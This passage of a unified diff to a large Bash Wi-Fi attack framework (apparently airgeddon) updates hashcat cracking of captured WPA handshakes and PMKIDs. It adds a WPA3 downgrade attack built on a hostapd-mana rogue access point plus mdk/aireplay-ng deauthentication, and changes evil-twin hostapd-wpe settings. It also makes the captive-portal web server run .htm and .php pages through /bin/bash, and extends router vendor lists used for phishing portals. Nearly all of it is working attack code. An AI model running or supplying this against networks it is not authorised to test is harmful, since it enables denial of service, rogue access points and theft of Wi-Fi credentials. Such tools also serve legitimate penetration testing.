 		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
-	elif [ "${1}" = "personal_pmkid" ]; then
-		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
-		hashcat_cmd="hashcat -m ${hashcat_pmkid_cracking_plugin} -a 0 \"${hashcatpmkidenteredpath}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
+		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
 	else
 		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
 		hashcat_cmd="hashcat -m ${hashcat_enterprise_cracking_plugin} -a 0 \"${hashcatenterpriseenteredpath}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
@@ -9951,11 +10383,10 @@ function exec_hashcat_bruteforce_attack() {
 
 	debug_print
 
-	if [ "${1}" = "personal_handshake" ]; then
+	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
 		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 3 \"${tmpdir}${hashcat_tmp_file}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
-	elif [ "${1}" = "personal_pmkid" ]; then
-		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
-		hashcat_cmd="hashcat -m ${hashcat_pmkid_cracking_plugin} -a 3 \"${hashcatpmkidenteredpath}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
+		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 3 \"${tmpdir}${hashcat_tmp_file}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
 	else
 		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
 		hashcat_cmd="hashcat -m ${hashcat_enterprise_cracking_plugin} -a 3 \"${hashcatenterpriseenteredpath}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
@@ -9969,17 +10400,31 @@ function exec_hashcat_rulebased_attack() {
 
 	debug_print
 
-	if [ "${1}" = "personal_handshake" ]; then
+	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
 		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
-	elif [ "${1}" = "personal_pmkid" ]; then
-		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
-		hashcat_cmd="hashcat -m ${hashcat_pmkid_cracking_plugin} -a 0 \"${hashcatpmkidenteredpath}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
+		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
 	else
 		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
 		hashcat_cmd="hashcat -m ${hashcat_enterprise_cracking_plugin} -a 0 \"${hashcatenterpriseenteredpath}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
 	fi
 	eval "${hashcat_cmd}"
 	language_strings "${language}" 115 "read"
+}
+
+#Execute WPA3 downgrade attack
+function exec_wpa3_downgrade_attack() {
+
+	debug_print
+
+	set_hostapd_mana_config
+	launch_fake_mana_ap
+	exec_wpa3_downgrade_deauth
+	check_mana_hashes
+	kill_wpa3_downgrade_attack_processes
+	restore_wpa3_downgrade_interface
+	manage_mana_pot
+	clean_tmpfiles
 }
 
 #Execute Enterprise smooth/noisy attack
@@ -10255,7 +10700,6 @@ function exec_et_sniffing_sslstrip2_beef_attack() {
 		new_beef_pass="beef"
 		et_misc_texts[${language},27]=${et_misc_texts[${language},27]/${beef_pass}/${new_beef_pass}}
 		beef_pass="${new_beef_pass}"
-
 	fi
 	launch_beef
 	launch_bettercap_sniffing
@@ -10369,6 +10813,60 @@ function set_bettercap_config() {
 	} >> "${tmpdir}${bettercap_config_file}"
 }
 
+#Create configuration file for hostapd-mana
+function set_hostapd_mana_config() {
+
+	debug_print
+
+	rm -rf "${tmpdir}${hostapd_mana_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${hostapd_mana_out}" > /dev/null 2>&1
+
+	et_bssid=$(generate_fake_bssid "${bssid}")
+
+	{
+	echo -e "interface=${interface}"
+	echo -e "driver=nl80211"
+	echo -e "ssid=${essid}"
+	echo -e "bssid=${et_bssid}"
+	echo -e "mana_wpaout=${tmpdir}${hostapd_mana_out}"
+	echo -e "wpa=2"
+	echo -e "wpa_key_mgmt=WPA-PSK"
+	echo -e "wpa_pairwise=TKIP CCMP"
+	echo -e "wpa_passphrase=\"${mana_pass}\""
+	echo -e "channel=${channel}"
+	} >> "${tmpdir}${hostapd_mana_file}"
+
+	if [ "${channel}" -gt 14 ]; then
+		{
+		echo -e "hw_mode=a"
+		} >> "${tmpdir}${hostapd_mana_file}"
+	else
+		{
+		echo -e "hw_mode=g"
+		} >> "${tmpdir}${hostapd_mana_file}"
+	fi
+
+	if [ "${country_code}" != "00" ]; then
+		{
+		echo -e "country_code=${country_code}"
+		} >> "${tmpdir}${hostapd_mana_file}"
+	fi
+
+	if [ "${standard_80211n}" -eq 1 ]; then
+		{
+		echo -e "ieee80211n=1"
+		} >> "${tmpdir}${hostapd_mana_file}"
+	fi
+
+	if [ "${standard_80211ac}" -eq 1 ]; then
+		{
+		echo -e "ieee80211ac=1"
+		} >> "${tmpdir}${hostapd_mana_file}"
+	fi
+
+	#ieee80211ax and ieee80211be not supported
+}
+
 #Create configuration file for hostapd
 function set_hostapd_config() {
 
@@ -10387,6 +10885,8 @@ function set_hostapd_config() {
 	echo -e "ssid=${et_essid}"
 	echo -e "bssid=${et_bssid}"
 	echo -e "channel=${channel}"
+	echo -e "wpa=0"
+	echo -e "ignore_broadcast_ssid=0"
 	} >> "${tmpdir}${hostapd_file}"
 
 	if [ "${channel}" -gt 14 ]; then
@@ -10442,12 +10942,11 @@ function set_hostapd_wpe_config() {
 	rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1
 
 	et_bssid=$(generate_fake_bssid "${bssid}")
-	et_essid=$(generate_fake_essid "${essid}")
 
 	{
 	echo -e "interface=${interface}"
 	echo -e "driver=nl80211"
-	echo -e "ssid=${et_essid}"
+	echo -e "ssid=${essid}"
 	echo -e "bssid=${et_bssid}"
 	echo -e "channel=${channel}"
 	echo -e "eap_server=1"
@@ -10460,9 +10959,11 @@ function set_hostapd_wpe_config() {
 	echo -e "pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f"
 	echo -e "wpa=2"
 	echo -e "wpa_key_mgmt=WPA-EAP"
-	echo -e "wpa_pairwise=CCMP"
-	echo -e "rsn_pairwise=CCMP"
+	echo -e "wpa_pairwise=TKIP CCMP"
+	echo -e "rsn_pairwise=TKIP CCMP"
 	echo -e "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user"
+	echo -e "ieee80211w=0"
+	echo -e "auth_algs=3"
 	} >> "${tmpdir}${hostapd_wpe_file}"
 
 	{
@@ -10543,6 +11044,39 @@ function generate_fake_essid() {
 	else
 		echo -e "${1}"
 	fi
+}
+
+#Launch hostapd-mana fake Access Point
+function launch_fake_mana_ap() {
+
+	debug_print
+
+	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
+		${airmon} check kill > /dev/null 2>&1
+		nm_processes_killed=1
+	else
+		if [ "${check_kill_needed}" -eq 1 ]; then
+			${airmon} check kill > /dev/null 2>&1
+			nm_processes_killed=1
+		fi
+	fi
+
+	if [ "${mac_spoofing_desired}" -eq 1 ]; then
+		set_spoofed_mac "${interface}"
+	fi
+
+	rm -rf "${tmpdir}${hostapd_mana_log}" > /dev/null 2>&1
+	recalculate_windows_sizes
+	manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g1_topright_window} -T \"AP\"" "timeout -s SIGTERM ${timeout_wpa3_downgrade} hostapd-mana \"${tmpdir}${hostapd_mana_file}\" | tee ${tmpdir}${hostapd_mana_log}" "AP" "active"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		hostapd_mana_pid=$!
+	else
+		get_tmux_process_id "timeout -s SIGTERM ${timeout_wpa3_downgrade} hostapd-mana \"${tmpdir}${hostapd_mana_file}\""
+		hostapd_mana_pid="${global_process_pid}"
+		global_process_pid=""
+	fi
+
+	sleep 3
 }
 
 #Launch hostapd and hostapd-wpe fake Access Point
@@ -10915,6 +11449,40 @@ function exec_et_deauth() {
 	fi
 }
 
+#Execute DoS for WPA3 downgrade attack
+function exec_wpa3_downgrade_deauth() {
+
+	debug_print
+
+	prepare_wpa3_downgrade_monitor
+
+	case ${downgrade_dos_attack} in
+		"${mdk_command}")
+			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
+			echo "${bssid}" > "${tmpdir}bl.txt"
+			deauth_downgrade_cmd="${mdk_command} ${iface_monitor_downgrade_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+		;;
+		"Aireplay")
+			deauth_downgrade_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_downgrade_deauth}"
+		;;
+		"Auth DoS")
+			deauth_downgrade_cmd="${mdk_command} ${iface_monitor_downgrade_deauth} a -a ${bssid} -m"
+		;;
+	esac
+
+	recalculate_windows_sizes
+	manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"Deauth\"" "${deauth_downgrade_cmd}" "Deauth"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		downgrade_dos_pid=$!
+	else
+		get_tmux_process_id "${deauth_downgrade_cmd}"
+		downgrade_dos_pid="${global_process_pid}"
+		global_process_pid=""
+	fi
+
+	sleep 1
+}
+
 #Create here-doc bash script used for wps pin attacks
 function set_wps_attack_script() {
 
@@ -11021,6 +11589,8 @@ function set_wps_attack_script() {
 			rm -rf "/var/lib/reaver/"*.wpc > /dev/null 2>&1
 			rm -rf "/var/lib/lib/reaver/"*.wpc > /dev/null 2>&1
 			rm -rf "/etc/reaver/"*.wpc > /dev/null 2>&1
+			rm -rf "/usr/local/var/lib/reaver/"*.wpc > /dev/null 2>&1
+			rm -rf "/usr/local/etc/reaver/"*.wpc > /dev/null 2>&1
 		}
 
 		#Check if the password was obtained through the wps pin
@@ -11965,9 +12535,18 @@ function set_webserver_config() {
 	echo -e "server.error-handler-404 = \"/\"\n"
 	echo -e "mimetype.assign = ("
 	echo -e "\".css\" => \"text/css\","
+	echo -e "\".htm\" => \"text/html\","
+	echo -e "\".html\" => \"text/html\","
 	echo -e "\".js\" => \"text/javascript\""
 	echo -e ")\n"
-	echo -e "cgi.assign = (\".htm\" => \"/bin/bash\")\n"
+	echo -e "cgi.assign = ("
+	echo -e "\".htm\" => \"/bin/bash\""
+	} >> "${tmpdir}${webserver_file}"
+	if [ "${customportals_php_as_cgi}" -eq 1 ]; then
+		echo -e ",\".php\" => \"/bin/bash\"" >> "${tmpdir}${webserver_file}"
+	fi
+	{
+	echo -e ")\n"
 	echo -e "accesslog.filename = \"${tmpdir}${webserver_log}\""
 	echo -e "accesslog.escaping = \"default\""
 	echo -e "accesslog.format = \"%h %s %r %v%U %t '%{User-Agent}i'\""
@@ -12002,6 +12581,7 @@ function prepare_captive_portal_data() {
 										["Huawei"]="001882 001E10 002568 00259E 002EC7 0034FE 00464B 005A13 00664B 009ACD 00BE3B 00E0FC 00F81C 04021F 0425C5 042758 043389 044A6C 044F4C 047503 047970 04885F 048C16 049FCA 04B0E7 04BD70 04C06F 04F938 04FE8D 0819A6 08318B 084F0A 086361 087A4C 08C021 08E84F 0C2C54 0C37DC 0C41E9 0C45BA 0C704A 0C8FFF 0C96BF 0CB527 0CC6CC 0CD6BD 100177 101B54 104400 104780 105172 10B1F8 10C172 10C3AB 10C61F 1409DC 1413FB 143004 143CC3 14579F 145F94 149D09 14A0F8 14A51A 14B968 14D11F 14D169 18022D 183D5E 185644 18C58A 18CF24 18D276 18DED7 1C151F 1C1D67 1C20DB 1C4363 1C599B 1C6758 1C7F2C 1C8E5C 1CAECB 1CB796 2008ED 200BC7 20283E 202BC1 203DB2 2054FA 20658E 20A680 20AB48 20DA22 20F17C 20F3A3 2400BA 240995 24166D 241FA0 242E02 243154 244427 244C07 2469A5 247F3C 249EAB 24A52C 24BCF8 24DA33 24DBAC 24DF6A 24FB65 2811EC 283152 283CE4 2841C6 285FDB 286ED4 289E97 28A6DB 28B448 28DEE5 28E34E 2C1A01 2C55D3 2C58E8 2C97B1 2C9D1E 2CAB00 2CCF58 304596 307496 308730 30A1FA 30C50F 30D17E 30E98E 30F335 30FBB8 30FD65 3400A3 340A98 3412F9 341E6B 342912 342EB6 346AC2 346BD3 347916 34A2A2 34B354 34CDBE 38378B 3847BC 384C4F 38881E 38BC01 38EB47 38F889 38FB14 3C15FB 3C306F 3C4711 3C678C 3C7843 3C9D56 3CCD5D 3CDFBD 3CE824 3CF808 3CFA43 404D8E 407D0F 40CBA8 40EEDD 44004D 4455B1 4459E3 446747 446A2E 446EE5 447654 4482E5 44A191 44C346 44D791 480031 482CD0 483C0C 483FE9 48435A 4846FB 485702 486276 487B6B 488EEF 48AD08 48D539 48DB50 48DC2D 48F8DB 48FD8E 4C1FCC 4C5499 4C8BEF 4CB16C 4CD0CB 4CD1A1 4CF55B 4CF95D 4CFB45 50016B 5001D9 5004B8 501D93 50464A 505DAC 50680A 506F77 509F27 50A72B 541310 5425EA 5434EF 5439DF 54511B 548998 549209 54A51B 54B121 54BAD6 581F28 582575 582AF7 58605F 587F66 58BAD4 58D759 58F987 5C0339 5C0979 5C4CA9 5C546D 5C7D5E 5C9157 5CA86A 5CB395 5CB43E 5CC307 5CE883 5CF96A 600810 60123C 602E20 607ECD 608334 60D755 60DE44 60DEF3 60E701 60F18A 60FA9D 6416F0 642CAC 643E8C 646D6C 64A651 684AAE 6889C1 688F84 68A03E 68A0F6 68A828 68CC6E 68E209 6C1632 6CB749 6CEBB6 70192F 702F35 7054F5 70723C 707990 707BE8 708A09 708CB6 70A8E3 70C7F2 70D313 70FD45 745909 745AAA 7460FA 74882A 749D8F 74A063 74A528 74C14F 74D21D 7817BE 781DBA 785773 785860 786256 786A89 78B46A 78D752 78F557 78F5FD 7C11CB 7C1CF1 7C6097 7C7668 7C7D3D 7C942A 7CA177 7CA23E 7CB15D 7CC385 7CD9A0 801382 8038BC 804126 806933 80717A 807D14 80B575 80B686 80D09B 80D4A5 80E1BF 80FB06 8421F1 843E92 8446FE 844765 845B12 847637 849FB5 84A8E4 84A9C4 84AD58 84BE52 84DBAC 88108F 881196 8828B3 883FD3 884033 88403B 884477 8853D4 886639 888603 88A2D7 88BCC1 88BFE4 88CEFA 88CF98 88E3AB 88F56E 88F872 8C0D76 8C15C7 8C2505 8C34FD 8C426D 8C683A 8C6D77 8CE5EF 8CEBC6 8CFD18 900325 9016BA 90173F 9017AC 9017C8 902BD2 903FEA 904E2B 90671C 909497 9400B0 94049C 940B19 940E6B 942533 94772B 94D00D 94DBDA 94E7EA 94FE22 9835ED 9844CE 989C57 98E7F5 9C1D36 9C28EF 9C37F4 9C52F8 9C69D1 9C713A 9C741A 9C7DA3 9CB2B2 9CC172 9CE374 A0086F A01C8D A057E3 A08CF8 A08D16 A0A33B A0DF15 A0F479 A400E2 A416E7 A47174 A4933F A49947 A49B4F A4BA76 A4BDC4 A4BE2B A4C64F A4CAA0 A4DCBE A80C63 A82BCD A8494D A87D12 A8C83A A8CA7B A8E544 A8F5AC AC075F AC4E91 AC6089 AC6175 AC751D AC853D AC8D34 AC9232 ACB3B5 ACCF85 ACE215 ACE342 ACE87B ACF970 B00875 B05508 B05B67 B0761B B08900 B0E17E B0E5ED B0EB57 B40931 B41513 B43052 B44326 B46E08 B48655 B4B055 B4CD27 B4F58E B4FBF9 B808D7 B89436 B8BC1B B8C385 B8E3B1 BC25E0 BC3D85 BC3F8F BC620E BC7574 BC7670 BC9C31 BCB0E7 BCE265 C07009 C0BFC0 C0F4E6 C0FFA8 C40528 C40683 C4072F C4447D C4473F C467D1 C486E9 C49F4C C4A402 C4B8B4 C4F081 C4FF1F C80CC8 C81451 C81FBE C850CE C85195 C88D83 C894BB C8A776 C8C2FA C8C465 C8D15E CC0577 CC53B5 CC64A6 CC96A0 CCA223 CCBBFE CCCC81 CCD73C D016B4 D02DB3 D03E5C D065CA D06F82 D07AB5 D0C65B D0D04B D0D783 D0EFC1 D0FF98 D440F0 D44649 D4612E D462EA D46AA8 D46BA6 D46E5C D494E8 D4A148 D4B110 D4F9A1 D82918 D8490B D89B3B D8C771 DC094C DC16B2 DC21E2 DC729B DC9088 DC9914 DCC64B DCD2FC DCD916 DCEE06 E00084 E0191D E0247F E02481 E02861 E03676 E09796 E0A3AC E0CC7A E40EEE E419C1 E43493 E435C8 E43EC6 E468A3 E472E2 E47E66 E48326 E4A7C5 E4A8B6 E4C2D1 E4FB5D E4FDA1 E8088B E84DD0 E86819 E884C6 E8ABF3 E8BDD1 E8CD2D EC233D EC388F EC4D47 EC5623 EC8914 EC8C9A ECC01B ECCB30 F00FEC F02FA7 F033E5 F03F95 F04347 F063F9 F09838 F09BB8 F0C850 F0E4A2 F41D6B F44C7F F4559C F4631F F47960 F48E92 F49FF3 F4A4D6 F4B78D F4BF80 F4C714 F4CB52 F4DCF9 F4DEAF F4E3FB F4E5F2 F80113 F823B2 F83DFF F84ABF F86EEE F87588 F898B9 F898EF F89A78 F8BF09 F8C39E F8E811 FC1BD1 FC3F7C FC48EF FC8743 FC9435 FCAB90 FCBCD1 FCE33C"
 										["Juniper"]="000585 0010DB 00121E 0014F6 0017CB 0019E2 001BC0 001DB5 001F12 002159 002283 00239C 0024DC 002688 003146 009069 045C6C 0881F4 0C599C 0C8126 0C8610 100E7E 1039E9 182AD3 1C9C8C 201BC9 204E71 20D80B 288A1C 28A24B 28C0DA 2C2131 2C2172 2C6BF5 307C5E 30B64F 384F49 3C6104 3C8AB0 3C8C93 3C94D5 407183 40A677 40B4F0 40DEAD 44AA50 44ECCE 44F477 4C16FC 4C9614 50C58D 50C709 541E56 544B8C 54E032 5800BB 5C4527 5C5EAB 64649B 648788 64C3D6 7819F7 784F9B 78507C 78FE3D 7C2586 7CE2CA 80711F 807FF8 80ACAC 841888 84B59C 84C1C1 88A25E 88D98F 88E0F3 88E64B 94BF94 94F7AD 9C8ACB 9CCC83 A8D0E5 AC4BC8 B033A6 B0A86E B0C69A B8C253 C00380 C042D0 C0535E C0BFA7 C8E7F0 CCE17F CCE194 D007CA D0DD49 D404FF D818D3 D8B122 DC38E1 E45D37 E4FC82 E8B6C2 EC13DB EC3873 EC3EF7 F01C2D F04B3A F07CC7 F4A739 F4B52F F4CC55 F8C001 FC3342 E08B258"
 										["Linksys"]="000C41 000E08 000F66 001217 001310 0014BF 0016B6 001839 0018F8 001A70 001C10 001D7E 001EE5 002129 00226B 002369 00259C 20AA4B 48F8B3 586D8F 687F74 98FC11 C0C1C0 C8B373 C8D719"
+										["Mercusys"]="00EBD8 088AF1 0C1C31 30169D 94742E"
 										["Mitrastar"]="0C4C39 345760 84AA9C 9897D1 A433D7 ACC662 B046FC B8FFB3 C03DD9 CCD4A1 CCEDDC D8C678 E04136 E4AB89"
 										["Motorola"]="000E5C 04D395 08AA55 08CC27 0CCB85 141AA3 1430C6 1C56FE 2446C8 24DA9B 304B07 34BB26 3880DF 40786A 408805 441C7F 4480EB 58D9C3 5C5188 601D91 60BEB5 68C44D 8058F8 806C1B 84100D 88797E 88B4A6 8CF112 9068C3 90735A 9CD917 A470D6 A89675 B07994 BC98DF BCFFEB C08C71 C8C750 CC0DF2 CC61E5 CCC3EA D00401 D07714 D463C6 D4C94B DCBFE9 E0757D E09861 E4907E E89120 EC8892 F0D7AA F4F1E1 F4F524 F81F32 F8CFC5 F8E079 F8F1B6"
 										["Netgear"]="00095B 000FB5 00146C 00184D 001B2F 001E2A 001F33 00223F 0024B2 0026F2 008EF2 04A151 08028E 0836C9 08BD43 100C6B 100D7F 10DA43 1459C0 200CC8 204E7F 20E52A 288088 28C68E 2C3033 2CB05D 30469A 3894ED 3C3786 405D82 4494FC 44A56E 4C60DE 504A6E 506A03 6CB0CE 744401 78D294 803773 841B5E 8C3BAD 9C3DCF 9CC9EB 9CD36D A00460 A021B7 A040A0 A06391 A42B8C B03956 B07FB9 B0B98A BCA511 C03F0E C0FFD4 C40415 C43DC7 CC40D0 DCEF09 E0469A E091F5 E4F4C6 E8FCAF F87394"
@@ -12010,12 +12590,12 @@ function prepare_captive_portal_data() {
 										["Sphairon"]="001C28"
 										["Technicolor"]="2C301A F01628 101331 20B001 30918F 589835 705A9E 9C9726 A0B53C A491B1 A4B1E9 C4EA1D D4351D D4925E E0B9E5"
 										["Teldat"]="001967 00A026"
-										["TP-Link"]="000AEB 001478 0019E0 001D0F 002127 0023CD 002586 002719 081F71 085700 0C4B54 0C722C 0C8063 0C8268 10FEED 147590 148692 14CC20 14CF92 14E6E4 18A6F7 18D6C7 1C3BF3 1C4419 1CFA68 206BE7 20DCE6 246968 282CB2 28EE52 30B49E 30B5C2 30FC68 349672 34E894 388345 3C46D8 40169F 403F8C 44B32D 480EEC 487D2E 503EAA 50BD5F 50C7BF 50D4F7 50FA84 547595 54A703 54C80F 54E6FC 5C63BF 5C899A 603A7C 60E327 645601 6466B3 646E97 647002 68FF7B 6CE873 704F57 7405A5 74DA88 74EA3A 7844FD 78A106 7C8BCA 7CB59B 808917 808F1D 8416F9 882593 8C210A 8CA6DF 90AE1B 90F652 940C6D 94D9B3 984827 98DAC4 98DED0 9C216A 9CA615 A0F3C1 A42BB0 A8154D A8574E AC84C6 B0487A B04E26 B09575 B0958E B0BE76 B8F883 BC4699 BCD177 C025E9 C04A00 C06118 C0E42D C46E1F C47154 C4E984 CC08FB CC32E5 CC3429 D03745 D076E7 D0C7C0 D4016D D46E0E D807B6 D80D17 D8150D D84732 D85D4C DC0077 DCFE18 E005C5 E4D332 E894F6 E8DE27 EC086B EC172F EC26CA EC888F F0F336 F483CD F4EC38 F4F26D F81A67 F8D111 FCD733"
+										["TP-Link"]="000AEB 001478 0019E0 001D0F 002127 0023CD 002586 002719 081F71 085700 0C4B54 0C722C 0C8063 0C8268 10FEED 147590 148692 14CC20 14CF92 14E6E4 18A6F7 18D6C7 1C3BF3 1C4419 1CFA68 206BE7 20DCE6 246968 282CB2 28EE52 30B49E 30B5C2 30FC68 349672 34E894 388345 3C46D8 3C6AD2 40169F 403F8C 44B32D 480EEC 487D2E 503EAA 50BD5F 50C7BF 50D4F7 50FA84 547595 54A703 54C80F 54E6FC 5C63BF 5C899A 603A7C 60E327 645601 6466B3 646E97 647002 68FF7B 6CE873 704F57 7405A5 74DA88 74EA3A 7844FD 78A106 7C8BCA 7CB59B 808917 808F1D 8416F9 882593 8C210A 8CA6DF 90AE1B 90F652 940C6D 94D9B3 984827 98DAC4 98DED0 9C216A 9CA615 A0F3C1 A42BB0 A8154D A8574E AC84C6 B0487A B04E26 B09575 B0958E B0BE76 B8F883 BC4699 BCD177 C025E9 C04A00 C06118 C0E42D C46E1F C47154 C4E984 CC08FB CC32E5 CC3429 D03745 D076E7 D0C7C0 D4016D D46E0E D807B6 D80D17 D8150D D84732 D85D4C DC0077 DCFE18 E005C5 E4D332 E894F6 E8DE27 EC086B EC172F EC26CA EC888F F0F336 F483CD F4EC38 F4F26D F81A67 F8D111 FCD733"
 										["Ubiquiti"]="00156D 002722 0418D6 18E829 24A43C 44D9E7 687251 68D79A 7483C2 74ACB9 788A20 802AA8 B4FBE4 DC9FDB E063DA F09FC2 F492BF FCECDA"
 										["Vantiva"]="F85E42"
 										["Xavi"]="000138 E09153"
 										["ZTE"]="000947 0015EB 0019C6 001E73 002293 002512 0026ED 004A77 041DC7 049573 08181A 083FBC 086083 0C1262 0C3747 0C72D9 10D0AB 143EBF 146080 146B9A 18132D 1844E6 18686A 1C2704 208986 20E882 24586E 247E51 24C44A 24D3F2 287B09 288CB8 28FF3E 2C26C5 2C957F 300C23 304240 309935 30D386 30F31D 343759 344B50 344DEA 346987 347839 34DAB7 34DE34 34E0CF 384608 386E88 38D82F 38E1AA 38E2DD 3CDA2A 3CF652 4413D0 44F436 44FB5A 44FFBA 48282F 4859A4 48A74E 4C09B4 4C16F1 4C494F 4CABFC 4CAC0A 4CCBF5 5078B3 50AF4D 540955 5422F8 54BE53 585FF6 5C3A3D 601466 601888 6073BC 64136C 681AB2 688AF0 689FF0 6C8B2F 6CA75F 6CD2BA 702E22 709F2D 744AA4 749781 74A78E 74B57E 781D4A 78312B 789682 78C1A7 78E8B6 7C3953 80B07B 84139F 841C70 84742A 847460 885DFB 88D274 8C14B4 8C68C8 8C7967 8CDC02 8CE081 8CE117 901D27 90869B 90C7D8 90D8F3 90FD73 949869 94A7B7 94BF80 94E3EE 98006A 981333 986CF5 98F428 98F537 9C2F4E 9C63ED 9C6F52 9CA9E4 9CD24B 9CE91C A091C8 A0EC80 A44027 A47E39 A4F33B A8A668 AC00D0 AC6462 B00AD5 B075D5 B0ACD2 B0B194 B0C19E B41C30 B49842 B4B362 B4DEDF B805AB BC1695 C09FE1 C0B101 C0FD84 C4741E C4A366 C85A9F C864C7 C87B5B C8EAF8 CC1AFA CC7B35 D0154A D058A8 D05BA8 D0608C D071C4 D437D7 D47226 D476EA D49E05 D4B709 D4C1C8 D855A3 D87495 D8A8C8 DC028E DC7137 DCDFD6 DCF8B9 E01954 E0383F E07C13 E0C3F3 E447B3 E47723 E47E9A E4BD4B E4CA12 E8A1F8 E8ACAD E8B541 EC1D7F EC237B EC6CB5 EC8263 EC8A4C ECF0FE F084C9 F41F88 F46DE2 F4B5AA F4B8A7 F4E4AD F80DF0 F8A34F F8DFA8 FC2D5E FC94CE FCC897"
-										["Zyxel"]="001349 0019CB 0023F8 00A0C5 04BF6D 082697 1071B3 107BEF 143375 14360E 1C740D 28285D 30BD13 404A03 48EDE6 4C9EFF 4CC53E 5067F0 50E039 54833A 588BF3 5C648E 5C6A80 5CE28C 5CF4AB 603197 64DD68 6C4F89 7049A2 78C57D 7C7716 80EA0B 88ACC0 8C5973 909F22 90EF68 980D67 A0E4CB B0B2DC B8D526 B8ECA3 BC7EC3 BC9911 BCCF4F C8544B C86C87 CC5D4E D41AD1 D43DF3 D8912A D8ECE5 E4186B E8377A EC3EB3 EC43F6 F08756 F44D5C F80DA9 FC22F4 FC9F2A FCF528"
+										["Zyxel"]="001349 0019CB 0023F8 00A0C5 04BF6D 082697 1071B3 107BEF 143375 14360E 1C740D 2037F0 28285D 30BD13 404A03 48EDE6 4C9EFF 4CC53E 5067F0 50E039 54833A 588BF3 5C648E 5C6A80 5CE28C 5CF4AB 603197 64DD68 6C4F89 7049A2 78C57D 7C7716 80EA0B 88ACC0 8C5973 909F22 90EF68 980D67 A0E4CB B0B2DC B8D526 B8ECA3 BC7EC3 BC9911 BCCF4F C8544B C86C87 CC5D4E D41AD1 D43DF3 D8912A D8ECE5 E4186B E8377A EC3EB3 EC43F6 F08756 F44D5C F80DA9 FC22F4 FC9F2A FCF528"
 									)
 
 		declare -gA cp_router_colors=(
@@ -12036,6 +12616,7 @@ function prepare_captive_portal_data() {
